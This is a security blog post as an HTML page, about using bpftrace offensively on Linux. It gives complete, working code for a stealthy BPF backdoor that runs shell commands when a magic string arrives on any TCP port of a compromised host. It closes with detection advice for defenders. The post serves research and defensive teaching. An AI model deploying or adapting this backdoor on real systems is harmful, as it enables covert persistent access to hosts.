<!DOCTYPE html>
<html lang="en-us">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <meta property="og:title" content=" Offensive BPF - Malicious deeds with bpftrace &middot;  Embrace The Red" />
  
  <meta property="og:site_name" content="Embrace The Red" />
  <meta property="og:url" content="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/" />
  
  
  <meta property="og:type" content="article" />
  
  <meta property="og:article:published_time" content="2021-10-01T08:00:58-07:00" />
  
  <meta property="og:article:tag" content="pentest" />
  
  <meta property="og:article:tag" content="red" />
  
  <meta property="og:article:tag" content="research" />
  
  <meta property="og:article:tag" content="ebpf" />
  
  <meta property="og:article:tag" content="blue" />
  
  

  <title>
     Offensive BPF - Malicious deeds with bpftrace &middot;  Embrace The Red
  </title>

  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
  
  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
  

  
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@wunderwuzzi23">
<meta name="twitter:title" content="Offensive BPF - Malicious deeds with bpftrace">
<meta name="twitter:description" content="Using eBPF in offensive security settings and mitigations">
<meta name="twitter:image" content="https://embracethered.com/blog/images/2021/obpf.png">

<meta name="twitter:creator" content="@wunderwuzzi23">





</head>
<body>
    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
    <section class="header-text">
      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
      
      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
        wunderwuzzi&#39;s blog
        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
      </div>
      
      <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>

      
      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
        <i class="fa fa-angle-left" aria-hidden="true"></i>
        &nbsp;Home
      </a>
      
    
      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
        <i class="fa fa-rss" aria-hidden="true"></i>
        &nbsp;Subscribe
      </a>
    </section>
  </header>
  <main class="container">


<article>
  <header>
    <h1 class="text-primary">Offensive BPF - Malicious deeds with bpftrace</h1>
    <div class="post-meta clearfix">
    
      <div class="post-date pull-left">
        Posted on
        <time datetime="2021-10-01T08:00:58-07:00">
          Oct 1, 2021
        </time>
      </div>
    
      <div class="pull-right">
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/pentest">#pentest</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/research">#research</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ebpf">#ebpf</a></span>
        
        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/blue">#blue</a></span>
        
      </div>
    </div>
  </header>
  <section>
    <p><img src="/blog/images/2021/offensive-bpf.png" alt="Offensive BPF"></p>
<p>This post is part of a series about <strong>Offensive BPF</strong> that I&rsquo;m working on to learn about BPF to understand attacks and defenses, click the <a href="/blog/tags/ebpf">&ldquo;ebpf&rdquo;</a> tag to see all relevant posts.</p>
<h1 id="what-is-bpftrace">What is bpftrace</h1>
<p><code>bpftrace</code> is a versatile tool used to create custom bpf programs without having to deal with too many low-level things. The <a href="https://bpftrace.org/">bpftrace&rsquo;s homepage</a> calls it a &ldquo;High-level tracing language for Linux systems&rdquo;, and it has a cute logo.</p>
<p>It’s kind of <strong>bpf Swiss army knife</strong>.</p>
<p>My goal was to start at a higher level to learn BPF basics, grasp what is possible and where limitations are. <code>bpftrace</code> seems perfect for that. After building programs for a few days, I&rsquo;m really getting the hang of it.</p>
<p><img src="/blog/images/2021/pony.png" alt="Offensive BPF"></p>
<p>Let&rsquo;s explore <code>bpftrace</code> in an offensive setting and how misuse can be detected.</p>
<h2 id="installation">Installation</h2>
<p>Performance and observability teams are pushing for tooling to be present in production. Due to its usefulness, this is likely going to increase.</p>
<p>For experimenting with <code>bpftrace</code> on your own Linux box <a href="https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#ubuntu-packages">follow the instructions</a>.</p>
<p><em>Note: I also upgraded my Ubuntu machine to 21.04 (Kernel 5.11) to have all the latest features and debugging capabilities available, which ended up making my life a bit easier in learning BPF. But things will also work on a bit older versions.</em></p>
<h2 id="basic-example">Basic Example</h2>
<p>Here is a basic &ldquo;hello world&rdquo; examples you see when learning about <code>bpftrace</code>:</p>
<pre><code>sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(&quot;Hello, World: %s %s\n&quot;, comm, str(args-&gt;filename)) }
</code></pre><p>Can you guess what this is doing?</p>
<p>Let&rsquo;s look at the parameters:</p>
<ol>
<li><code>bpftrace</code> needs to run as <code>root</code>, or with <code>CAP_BPF</code> capabilities (used <code>sudo</code> here)</li>
<li><code>-e</code>: defines the <code>bpftrace</code> program</li>
<li><code>sys_enter_open</code> tracepoint is used to print <code>comm</code> (process name), and <code>args-&gt;filename</code></li>
</ol>
<p>There are a couple of <strong>magic variables</strong> used, like <code>comm</code> and <code>args</code>.</p>
<p><a href="https://www.brendangregg.com/BPF/bpftrace-cheat-sheet.html">Here is cheat sheet</a> by Brendan Gregg that I frequently use to lookup variable names and other bpftrace features.</p>
<p>This example gives an idea how powerful BPF programs are. Imagine hooking passwords API calls or network traffic and observing or exfiltrating the data.</p>
<h2 id="malicious-deeds-using-system">Malicious deeds using system()</h2>
<p>Naturally, I was also looking for a way to run shell commands and <code>bpftrace</code> conveniently has a <code>system()</code> command:</p>
<pre><code>bpftrace --unsafe -e 'BEGIN { printf(&quot;Hello Offensive BPF!\n&quot;);  system(&quot;whoami&quot;); }'
</code></pre><p>Notice that this requires the use of the <code>--unsafe</code> command line option.</p>
<p><strong>Detection Tip:</strong> Look for any unsafe bpftrace usage.</p>
<p><strong>Caveat:</strong> The string passed in to <code>system()</code> has to be a string literal and can&rsquo;t be a variable. This makes writing a generic command execution backdoor a little less straight forward – have some ideas now how to improve this – will be a separate post down the road.</p>
<h1 id="building-the-backdoor-using-bpftrace">Building the backdoor using bpftrace</h1>
<p>What can an adversary do? Let&rsquo;s dive into this a bit more.</p>
<ol>
<li>Assume an adversary gained privileged access to a host.</li>
<li>The adversary installs a <code>bpf</code> based TCP backdoor.</li>
<li>Now, whenever messages come from a certain IP (or source port) malicious commands are run</li>
<li>It does not matter what TCP service (HTTP, SSH, MySQL&hellip;) the client/attacker uses to trigger the backdoor</li>
</ol>
<p>It sounded simple and took me many hours (close to 3 days on and off) to figure out the very basics to get this going.</p>
<p>Let me share my learnings - this is also useful for anyone wanting to learn about BPF.</p>
<h2 id="source-port-based-malware-trigger">Source port-based malware trigger</h2>
<p>To keep it simple my first attempt was to use the source port information to awaken the <code>BPF</code> program.</p>
<p>Let&rsquo;s say a packet comes in on port <code>6666</code>, then the BPF program wakes up and does malicious stuff.</p>
<p>Being quite motivated, I created a BPF program hooked up <code>kprope:tcp_connect</code> and added the following <code>if</code> clause:</p>
<pre><code>if ( ((struct sock *) arg0)-&gt;__sk_common.skc_num == 6666) 
{  
    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/result.txt&quot;); 
}
</code></pre><p>When building more complex programs I found it better to store them in a file for easy editing. <code>bpftrace</code> programs typically have the <code>.bt</code> file extension.</p>
<p>The very first solution I came up with looked looks like this:</p>
<pre><code>#include &lt;net/sock.h&gt; 

BEGIN 
{ 
    printf(&quot;Welcome to Offensive BPF!\n&quot;); 
} 

kprobe:tcp_connect 
{ 
    if ( ((struct sock *) arg0)-&gt;__sk_common.skc_num == 6666) 
    { 
        printf(&quot;backdoor call&quot;);
        system(&quot;whoami &gt;&gt; /proc/1/root/tmp/result.txt&quot;); 
    }
}

END
{
    printf(&quot;Exiting. Bye.\n&quot;);
}
</code></pre><p>To run the BPF program I used <code>sudo bpftrace --unsafe obpf.bt</code>.</p>
<p>Indeed, this compiles and installs the BPF program into the kernel. Progress!</p>
<p>Now let&rsquo;s walk through the details:</p>
<ol>
<li><code>BEGIN</code>/<code>END</code>: Code that is run before and after. Here we just print a welcome and exit message.</li>
<li>Attach to <code>kprobe:tcp_connect</code> kernel probe. So, whenever a TCP connection happens this program will run</li>
<li>Using <code>struct sock *</code> (from the imported header file) to read the source port</li>
<li>Only if the source port is <code>6666</code> the <code>system</code> command will run and write the result to disk</li>
</ol>
<p>For testing, netcat (<code>nc</code>) allows you to specify the source port via the <code>-p</code> option, as follows:</p>
<pre><code>nc -vv 192.168.0.12 8888 -p 6666
</code></pre><p>I was excited when this worked on the server side and triggered the BPF program. Pretty cool!</p>
<p>There was one problem though&hellip;</p>
<p>This worked inside the local network but failed as soon as things traverse networks and NATs as source port can change.</p>
<h1 id="building-a-message-based-trigger">Building a message-based trigger</h1>
<p>What I really wanted is some kind of message-based trigger that runs when a &ldquo;secret backdoor message&rdquo; arrives on any port.</p>
<p>This is where I started learning a lot&hellip;</p>
<p>I spent time reading Linux source code and how TCP parsing works with <code>struct msghdr *</code> and related data structures. It&rsquo;s all a bit convoluted.</p>
<p>Searching through hook points with <code>bpftrace</code> identified a point of interest.</p>
<pre><code>$ sudo bpftrace -lv 'tracepoint:*enter_read' 
BTF: using data from /sys/kernel/btf/vmlinux
tracepoint:syscalls:sys_enter_read
    int __syscall_nr;
    unsigned int fd;
    char * buf;
    size_t count;
</code></pre><p>About the command line options:</p>
<ul>
<li><code>-l</code>:  lists all the tracepoints, kprobes, uprobes that match provided string</li>
<li><code>*</code>: Awesome: You can also use <code>*</code> as wildcards in the search</li>
<li><code>-v</code>: shows data structures details (very useful). This didn&rsquo;t work before upgrading to a very recent Ubuntu version</li>
</ul>
<p>I wanted to read and print the <code>char * buf</code>. But when coding this, <code>sys_enter_read</code> gets called BUT that buffer is not yet filled with data - so how to access the data?</p>
<h2 id="grasping-enter-and-exit-tracing-to-read-buffers">Grasping &ldquo;Enter&rdquo; and &ldquo;Exit&rdquo; tracing to read buffers</h2>
<p>It took me a bit to grasp how enter and exit tracepoints work in unison to achieve the desired result.</p>
<p>In retrospect it seems obvious, but for anyone starting this explanation should help:</p>
<p>Exit tracepoints (e.g. <code>sys_exit_read</code>) don&rsquo;t have access to the arguments passed into the function.</p>
<p>This puzzled me for a while&hellip;</p>
<p>The way to handle this is to use the <code>sys_enter_read</code> hook <strong>to store a pointer to the buffer in a thread local variable</strong>. Then use the <code>sys_exit_read</code> hook <strong>to read that pointer</strong> again.</p>
<p>In the exit hook the buffer (in this case <code>buf</code>) is filled with the data. The <code>sys_exit_*</code> functions have a <code>ret</code> value that tells you about the length of the buffer to read.</p>
<p>After figuring that out, everything fell into place, and I made quick progress.</p>
<p>Here is what this means in <code>bpftrace</code> code:</p>
<pre><code>tracepoint:syscalls:sys_enter_read
{ 
     @sys_read[tid] = args-&gt;buf;
}
</code></pre><p>This stores the <code>buf</code> pointer in <code>@variable[tid]</code>. In this case I named the varialble <code>@sys_read</code>.</p>
<p>Then in <code>sys_exit_read</code> the pointer is extracted, and we read the buffer as string.</p>
<pre><code>tracepoint:syscalls:sys_exit_read
/ @sys_read[tid] /   
{ 
  $cmd = str(@sys_read[tid], args-&gt;ret);
  printf(&quot;&lt;-sys_exit_read(tid:%d): len: %d, buf: %s\n&quot;, tid, args-&gt;ret, $cmd);
  
  if ($cmd == &quot;OhhhBPF!\n&quot;)
  {   
    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
  }

  printf(&quot;&lt;-sys_exit_read(tdi:%d): Done.\n&quot;, tid);
}
</code></pre><p>If the content of the buffer (now in variable <code>$cmd</code>) contains the word &ldquo;<code>OhhhBPF!\n</code>&rdquo; the program will run a simple <code>whoami</code> and store the result in a file. Notice the file path, using that namespace is another thing that took me quite a while to figure out.</p>
<h3 id="applying-a-filter">Applying a Filter</h3>
<p>A new concept in this example is applying a <code>filter</code> by using <code>/ @sys_read[tid] /</code>. This filters only calls that are relevant. If you want to filter by a certain process name specify it like: <code>/ comm=&quot;nc&quot; /</code></p>
<p>But that&rsquo;s it. At this point the program works as intended!</p>
<h2 id="improvements-tracing-only-socket-reads">Improvements: Tracing only socket reads!</h2>
<p>At that point reading buffers worked. It is noisy because all the <code>reads()</code> syscalls are traced, even though only socket connections are of interest.</p>
<p>There is probably a better way to do this, but with the newly acquired <code>bcptrace</code> chops, I thought to:</p>
<ul>
<li>Hook the socket <code>accept</code> call via the <code>syscalls:sys_enter_accept4</code> trace point. I learned about by the correct method to trace (<code>accept4</code>) by observing the systems calls of a <code>netcat</code> server, by running: <code>strace nc -lkv 20000</code></li>
<li>Add an IP address allow check to only allow a specific IP to cause the trigger</li>
<li>Store the file descriptor <code>fd</code> during <code>accept</code> in <code>@sys_accept[tid]</code> - so we keep track of which <code>fd</code> came from a socket</li>
<li>Update the <code>sys_enter_read</code> to ensure the read&rsquo;s file descriptor matches the one we stored</li>
</ul>
<p>This the resulting code:</p>
<pre><code>#include &lt;net/sock.h&gt;

BEGIN
{
    printf(&quot;Welcome to Offensive BPF... Use Ctrl-C to exit.\n&quot;);
}

tracepoint:syscalls:sys_enter_accept4 
{ 
  printf(&quot;-&gt;accept: Comm: %s, Allowed IP: %u&quot;, comm, $1 );

  $sk4=(struct sockaddr_in  *) args-&gt;upeer_sockaddr; 
  if ($sk4-&gt;sin_family == AF_INET) 
  { 
    $ip4 = $sk4-&gt;sin_addr;
    if ($ip4 == 123456789) # whitelisted IP as int
    {
      printf(&quot;-&gt;accept: *IPv4: fd:%d -- %s\n&quot;, args-&gt;fd, ntop($ip4) ); 
      @sys_accept[tid] = args-&gt;fd;  
    }
  } 
}

tracepoint:syscalls:sys_enter_read
{ 
  //only trace inet fd's
  if (args-&gt;fd == (uint64) @sys_accept[tid])
  {
     @sys_read[tid] = args-&gt;buf;
  }   
}

tracepoint:syscalls:sys_exit_read
/ @sys_read[tid] /   
{ 
  $cmd = str(@sys_read[tid], args-&gt;ret);
  printf(&quot;&lt;-sys_exit_read(tid:%d): len: %d, buf: %s\n&quot;, tid, args-&gt;ret, $cmd);
  
  if ($cmd == &quot;OhhhBPF: whoami\n&quot;)
  {   
    system(&quot;whoami &gt;&gt; /proc/1/root/tmp/o&quot;);
  }
 
  printf(&quot;&lt;-sys_exit_read(tdi:%d): Done.\n&quot;, tid);
}

END
{
    clear(@sys_read);
    clear(@sys_accept);
    printf(&quot;Exiting. Bye.\n&quot;);
}
</code></pre><p>After these changes the program works well, and without noise!</p>
<h2 id="bpf-backdoor-in-action">BPF Backdoor in Action</h2>
<p>After launching the BPF program on the compromised server, connecting to any port that is exposed on the server, and sending the &ldquo;magic string&rdquo; will run the backdoor program!</p>
<p>Mind blown!</p>
<p>In my final BPF program that will be used in Red Team Operations I added a couple more features to run more commands and exfiltrate files via a secure side channel - not publishing features now. Maybe in an upcoming post.</p>
<h1 id="detections">Detections</h1>
<p>There are a set of detection ideas for Blue Teams.</p>
<h2 id="collecting-telemetry">Collecting Telemetry</h2>
<p>Getting the telemetry around BPF syscalls is a crucial to getting insights into its usage across the fleet.</p>
<h2 id="inspecting-loaded-bpf-programs">Inspecting loaded BPF programs</h2>
<p>Loaded BPF programs can be inspected via the <code>bpftool</code>.</p>
<p>For instance, <code>bpftool prog</code> will show you the details and you can see the malicious backdoor one-liner we used shows up:</p>
<p><img src="/blog/images/2021/bpfprog.png" alt="BPF prog output"></p>
<h2 id="--unsafe-bpftrace-usage-and-system-calls">&ndash;unsafe bpftrace usage and <code>system</code> calls</h2>
<p>The usage of a <code>system()</code> call seems very unusual. So looking for command line logs that contain <code>bpftrace --unsafe</code> seems a good way to catch <strong>dangerous</strong> bpf programs also.</p>
<h2 id="persistence">Persistence</h2>
<p>BPF programs don&rsquo;t survive a reboot, so an adversary will try to restart them (cron jobs, etc..). Be on the lookout!</p>
<p><strong>There is also the attack avenue to backdoor existing programs that performance teams use or that are executed regularly on hosts.</strong>  I haven&rsquo;t seen any signature validation approaches yet, which could help detect such changes.</p>
<h1 id="hooking-the-bpf-system-call-itself">Hooking the BPF system call itself!</h1>
<p>A nifty attacker will likely hook the <code>bpf()</code> system call itself to change blue teams reality - this is something I want to explore in a future post.</p>
<h1 id="conclusion">Conclusion</h1>
<p>Hope this second post in the series was useful from a more technical perspective and gives some ideas on what defenders need to start looking out for. I&rsquo;m confident that BPF malware will be quite common in the not-so-distant future, so let’s get a step ahead.</p>
<p>Twitter: <a href="https://twitter.com/wunderwuzzi23">@wunderwuzzi23</a></p>
<h1 id="resources">Resources</h1>
<ul>
<li><a href="https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html">BPF syscall</a></li>
<li><a href="https://www.kernel.org/doc/html/latest/bpf/index.html">BPF Documentation</a></li>
<li><a href="https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#ubuntu-packages">bpftrace install instructions</a></li>
<li><a href="https://bpftrace.org">bpftrace Homepage</a></li>
</ul>

  </section>
  <footer>
    
    
    
    <footer></footer><hr/>
    
    <ul class="pager">
      
      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
      
      <li class="author-contact">
        <a href="mailto:security@wunderwuzzi.net">
          <i class="fa fa-envelope-o" aria-hidden="true"></i>
          &nbsp;Contact me
        </a>
     </li>

      
      
      <li class="previous"><a href="https://embracethered.com/blog/posts/2021/offensive-bpf/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
    </ul>
  </footer>
</article>
</main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
     
     (c) WUNDERWUZZI 2018-2021
     <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>
 
     <div style="font-size:small;font-style: italic;color:crimson">
    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
    </div>
    </div>
</footer>
  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  



<script type="text/javascript">
  var _paq = window._paq || [];
  _paq.push(["disableCookies"]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//wuzzi.net/anamato/inc/";
    _paq.push(['setTrackerUrl', u+'rts.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
  
</body>
</html>

